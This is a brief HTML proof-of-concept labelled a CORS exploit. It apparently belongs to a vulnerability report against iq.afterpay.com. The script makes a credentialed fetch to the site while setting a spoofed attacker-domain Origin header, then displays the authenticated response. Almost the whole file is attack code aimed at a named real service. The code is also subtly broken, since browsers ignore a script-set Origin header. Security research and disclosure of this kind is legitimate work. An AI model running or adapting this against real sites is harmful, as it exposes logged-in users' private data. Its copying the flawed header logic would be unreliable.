<!-- Save as poc.html and open in browser while logged into Afterpay -->
<!DOCTYPE html>
<html>
  <body>
    <h1>🔥 CORS Exploit PoC</h1>
    <p>Trying to fetch authenticated content from: <code>https://iq.afterpay.com</code></p>

    <script>
      fetch("https://iq.afterpay.com", {
        method: "GET",
        credentials: "include",
        headers: {
          "Origin": "https://iq.afterpay.com.attacker.com"
        }
      })
      .then(response => response.text())
      .then(data => {
        document.body.innerHTML += `<pre>${data}</pre>`;
      })
      .catch(err => {
        document.body.innerHTML += `<pre>❌ Error:\n${err}</pre>`;
      });
    </script>
  </body>
</html>
